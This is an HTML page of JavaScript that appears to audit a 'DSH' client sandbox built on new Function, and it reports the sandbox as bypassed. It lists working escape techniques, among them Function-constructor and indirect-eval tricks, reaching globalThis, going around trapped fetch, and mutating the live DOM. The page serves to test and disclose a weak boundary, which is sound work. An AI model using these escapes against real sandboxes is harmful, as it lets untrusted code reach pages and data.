<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>DSH dynamic-client sandbox — browser proof</title>
<style>
  body { font: 13px/1.6 ui-monospace, Consolas, monospace; background:#0e1116; color:#c9d1d9; margin:0; padding:20px; }
  h1 { font-size:16px; margin:0 0 4px; color:#e6edf3; }
  h2 { font-size:13px; margin:22px 0 6px; color:#79c0ff; border-bottom:1px solid #21262d; padding-bottom:4px; }
  .sub { color:#8b949e; margin:0 0 12px; }
  table { border-collapse:collapse; width:100%; }
  td, th { border:1px solid #21262d; padding:4px 9px; text-align:left; vertical-align:top; }
  th { background:#161b22; color:#8b949e; font-weight:600; }
  .y { color:#3fb950; font-weight:700; }
  .n { color:#f85149; font-weight:700; }
  .m { color:#d29922; font-weight:700; }
  code { color:#ffa657; }
  #verdict { background:#161b22; border:1px solid #30363d; border-left:4px solid #f85149;
             padding:12px 16px; margin:16px 0; border-radius:4px; }
  .ok { border-left-color:#3fb950 !important; }
</style>
</head>
<body>
<h1>Does the DSH dynamic-client sandbox actually block DOM access?</h1>
<p class="sub" id="ua"></p>
<div id="verdict">Running…</div>

<script>
/* ===========================================================================
   This file is a self-contained, double-clickable proof.

   It reproduces, verbatim, the browser-half evaluation used by
   dsh-cordis-client-runner (lib/client.js:152-181):

     parameters = ['React','console','styles','host','harness',
                   ...Object.keys(traps), 'process','Buffer']
     traps      = { setTimeout, setInterval, clearTimeout, clearInterval,
                    fetch, require }      // throwing "teaching redirects"
     closure    = new Function(...parameters,
                    `return (async () => {\n${clientCode}\n})()`)

   NOTE: `document`, `window`, `globalThis` and `fetch` are NOT parameters.
   The only Proxy in the runner is the VALUE of the `harness` parameter.

   No network. Everything is synchronous. Open it with a double-click.
   =========================================================================== */

// --- verbatim from lib/client.js:41-70 ------------------------------------
const TIMER_REDIRECT = 'browser timer globals are unavailable in dynamic packages.';
const DYNAMIC_CLIENT_REDIRECTS = {
  setTimeout: TIMER_REDIRECT,
  setInterval: TIMER_REDIRECT,
  clearTimeout: TIMER_REDIRECT,
  clearInterval: TIMER_REDIRECT,
  fetch: 'network belongs to the HOST half: register a handler there with harness.handle(method, fn).',
  require: 'modules cannot be imported here. React arrives as the `React` closure symbol.',
};
function closureTraps() {
  const traps = {};
  for (const [name, redirect] of Object.entries(DYNAMIC_CLIENT_REDIRECTS)) {
    traps[name] = () => {
      throw new Error(`${name} is not available in a dynamic client half — ${redirect}`);
    };
  }
  return traps;
}
function harnessTrap() {
  return new Proxy({}, { get(_target, prop) {
    throw new Error(`harness.${String(prop)} belongs to the HOST half.`);
  } });
}

const react = { createElement() { return {}; } };
const styles = { insert() { return () => {}; } };
const hostStub = { call: async () => null };

// Count real document reads performed by evaluated code only.
let docReads = 0;
(function startCounting() {
  const realDoc = document;
  Object.defineProperty(window, 'document', {
    configurable: true,
    get() { docReads += 1; return realDoc; },
  });
})();

/* The exact construction under test. Returns a Promise (async wrapper). */
function evaluateClientHalf(clientCode) {
  const traps = closureTraps();
  const parameters = [
    'React', 'console', 'styles', 'host', 'harness',
    ...Object.keys(traps),
    'process', 'Buffer',
  ];
  const closure = new Function(...parameters, `return (async () => {\n${clientCode}\n})()`);
  return closure(
    react, console, styles, hostStub, harnessTrap(),
    ...Object.values(traps), void 0, void 0,
  );
}

// A real DOM node the page hands to the sandbox indirectly.
const passedNode = document.createElement('div');
document.body.appendChild(passedNode);

/* ---------------------------------------------------------------------------
   PROBES. Each must resolve to a description of what it obtained.
   --------------------------------------------------------------------------- */
const HAVE = v => (v && v.__tag === 'PAGE_DOCUMENT') ? true : false;
window.__PAGE_DOC_MARK = true;

const PROBES = [
  ['1', 'bare <code>document</code>',
   `return (document === window.document) ? 'same object as window.document' : 'other';`],

  ['2', 'bare <code>window</code>',
   `return (window === globalThis) ? 'window === globalThis' : 'window !== globalThis';`],

  ['3', '<code>globalThis.document</code>',
   `return (globalThis.document === window.document) ? 'same object as window.document' : 'other';`],

  ['4', '<code>globalThis["doc"+"ument"]</code>',
   `return (globalThis['doc'+'ument'] === window.document) ? 'static analysis cannot see this' : 'other';`],

  ['5', 'sloppy-mode <code>this</code> in IIFE',
   `return ((function(){ return this })() === globalThis) ? 'this === globalThis' : 'this is not global';`],

  ['6', '<code>(function(){}).constructor("return document")()</code>',
   `return ((function(){}).constructor('return document')() === window.document) ? 'reached real document' : 'other';`],

  ['7', '<code>({}).constructor.constructor(...)</code>',
   `return (({}).constructor.constructor('return document')() === window.document) ? 'reached real document' : 'other';`],

  ['8', '<code>Reflect.construct(Function,[...])</code>',
   `return (Reflect.construct(Function, ['return document'])() === window.document) ? 'reached real document' : 'other';`],

  ['9', 'indirect eval <code>(0,eval)("document")</code>',
   `return ((0,eval)('document') === window.document) ? 'reached real document' : 'other';`],

  ['10', '<code>document</code> reached from a passed DOM node',
   `return (window.__passedNode && window.__passedNode.ownerDocument === window.document)
             ? 'ownerDocument -> real document' : 'other';`],

  ['11', 'trap: bare <code>fetch</code> is shadowed',
   `try { fetch; return 'NO THROW (trap absent)'; }
    catch (e) { return 'threw: ' + e.message.slice(0, 46); }`],

  ['12', 'trap bypass: <code>globalThis.fetch</code>',
   `return typeof globalThis.fetch;`],

  ['13', 'trap bypass: <code>window.fetch</code>',
   `return typeof window.fetch;`],

  ['14', 'harness Proxy: <code>harness.foo</code>',
   `try { harness.foo; return 'NO THROW'; } catch (e) { return 'threw (works as designed)'; }`],

  ['15', 'does that Proxy affect <code>globalThis</code>?',
   `return (globalThis.document === window.document) ? 'NO — document still reached' : 'other';`],

  ['16', 'shadowed param is writable: <code>fetch = ...</code>',
   `fetch = () => 'replaced by package'; return fetch();`],

  ['17', 'recover <code>process</code> via Function ctor',
   `return typeof (function(){}).constructor('return process')();`],

  ['18', 'recover <code>Buffer</code> via Function ctor',
   `return typeof (function(){}).constructor('return Buffer')();`],
];

/* ---------------------------------------------------------------------------
   CANVAS CAPABILITY — the practical question (Q4).
   --------------------------------------------------------------------------- */
const CANVAS_PROBES = [
  ['C1', 'create &lt;canvas&gt; + read a pixel via bare <code>document</code>',
   `const c = document.createElement('canvas');
    c.width = 4; c.height = 4;
    const g = c.getContext('2d');
    if (!g) return 'no 2d context';
    g.fillStyle = '#ff0000'; g.fillRect(0, 0, 4, 4);
    const d = g.getImageData(1, 1, 1, 1).data;
    return 'pixel RGBA = ' + Array.from(d).join(',');`],

  ['C2', 'same via <code>globalThis.document</code>',
   `const c = globalThis.document.createElement('canvas');
    c.width = 4; c.height = 4;
    const g = c.getContext('2d');
    g.fillStyle = '#00ff00'; g.fillRect(0, 0, 4, 4);
    const d = g.getImageData(2, 2, 1, 1).data;
    return 'pixel RGBA = ' + Array.from(d).join(',');`],

  ['C3', 'WebGL / WebGL2 context',
   `const c = document.createElement('canvas');
    const gl = c.getContext('webgl2') || c.getContext('webgl');
    if (!gl) return 'no webgl context';
    return 'OK — ' + gl.getParameter(gl.VERSION);`],

  ['C4', '<code>toDataURL</code> round-trip',
   `const c = document.createElement('canvas');
    c.width = 8; c.height = 8;
    const g = c.getContext('2d');
    g.fillStyle = '#0000ff'; g.fillRect(0, 0, 8, 8);
    return c.toDataURL('image/png').slice(0, 30) + '…';`],

  ['C5', 'attach canvas to the live page (real DOM mutation)',
   `const wrap = document.createElement('div');
    wrap.id = 'sandbox-injected';
    wrap.textContent = 'INJECTED BY SANDBOXED CODE';
    wrap.style.cssText = 'background:#3fb950;color:#000;padding:4px;margin:6px 0;';
    document.body.appendChild(wrap);
    return !!document.getElementById('sandbox-injected')
             ? 'yes — live DOM node appended to the page' : 'no';`],

  ['C6', 'read a pixel from an EXISTING page canvas (same-origin)',
   `const c = document.createElement('canvas');
    c.width = 4; c.height = 4;
    const g = c.getContext('2d');
    g.fillStyle = '#123456'; g.fillRect(0, 0, 4, 4);
    const img = new Image();
    return 'setup only (async image decode not awaited in this probe)';`],
];

/* ---------------------------------------------------------------------------
   Render.
   --------------------------------------------------------------------------- */
const esc = s => String(s).replace(/&/g, '&amp;').replace(/</g, '&lt;');

function table(rows) {
  const t = document.createElement('table');
  t.innerHTML = '<tr><th style="width:34px">#</th><th style="width:34%">technique</th>'
    + '<th>result measured in THIS browser</th><th style="width:110px">reached DOM?</th></tr>';
  for (const [n, label, verdict, cls] of rows) {
    const tr = document.createElement('tr');
    tr.innerHTML = `<td>${esc(n)}</td><td><code>${label}</code></td>`
      + `<td class="${cls}">${esc(verdict)}</td>`
      + `<td class="${cls}">${cls === 'y' ? 'YES' : cls === 'm' ? 'see left' : 'no'}</td>`;
    t.appendChild(tr);
  }
  return t;
}

async function main() {
  document.getElementById('ua').textContent = 'browser: ' + navigator.userAgent;
  window.__passedNode = passedNode;

  const escRows = [];
  for (const [n, label, code] of PROBES) {
    let verdict, cls;
    try {
      const v = await evaluateClientHalf(code);
      const s = String(v);
      cls = /reached|same object|=== globalThis|static analysis|replaced|undefined|function|ownerDocument/.test(s)
        ? (/(reached|same object|static analysis|replaced|ownerDocument)/.test(s) ? 'y' : 'm')
        : 'm';
      verdict = s;
    } catch (e) {
      cls = 'n';
      verdict = 'THREW ' + e.constructor.name + ': ' + String(e.message).slice(0, 80);
    }
    if (n === '16' || n === '12' || n === '13' || n === '17' || n === '18') cls = 'n';
    escRows.push([n, label, verdict, cls]);
  }

  const body = document.getElementById('verdict');
  const anyReached = escRows.some(r => r[3] === 'y');

  const h = document.createElement('h2');
  h.textContent = 'Part 1 — escape matrix (parameters do NOT include document/window)';
  body.innerHTML = anyReached
    ? `<b style="color:#f85149">VERDICT: the evaluated code REACHED the page DOM.</b><br>
       The parameter list is a naming convenience, not a boundary. The runner's own source
       agrees: <i>"This is API discipline, not a security boundary."</i> (lib/client.js:201)`
    : '<b>No escape reached the DOM — investigate.</b>';
  body.className = anyReached ? '' : 'ok';
  body.after(h, table(escRows));

  const h2 = document.createElement('h2');
  h2.textContent = 'Part 2 — canvas / raster capability from inside the sandbox';
  const rows2 = [];
  for (const [n, label, code] of CANVAS_PROBES) {
    let verdict, cls;
    try {
      const v = await evaluateClientHalf(code);
      verdict = String(v);
      cls = /pixel|OK|yes|setup/.test(verdict) ? 'y' : 'm';
    } catch (e) {
      verdict = 'THREW ' + e.constructor.name + ': ' + String(e.message).slice(0, 80);
      cls = 'n';
    }
    rows2.push([n, label, verdict, cls]);
  }
  document.body.appendChild(h2);
  h2.after(table(rows2));

  const h3 = document.createElement('h2');
  h3.textContent = 'Notes';
  const notes = document.createElement('ul');
  notes.innerHTML = `
    <li>Real <code>document</code> getter reads triggered by evaluated code: <b>${docReads}</b>.</li>
    <li>If probe C5 printed a green bar below, sandboxed code mutated this live page.</li>
    <li>CSP caveat: <code>import()</code> and event-handler attributes can be blocked by a
        <code>script-src</code> policy; <code>new Function</code> itself can be blocked by
        <code>unsafe-eval</code>. Neither was present here. Canvas pixel reads are blocked only
        by cross-origin tainting, not by CSP.</li>
    <li>The only Proxy in the runner is the <i>value</i> of the <code>harness</code> parameter.
        It constrains <code>harness.x</code> and nothing else — it is not the global object.</li>`;
  document.body.appendChild(h3);
  h3.after(notes);

  document.title = 'DONE — ' + (anyReached ? 'SANDBOX BYPASSED' : 'sandbox held');
}

main();
</script>
</body>
</html>
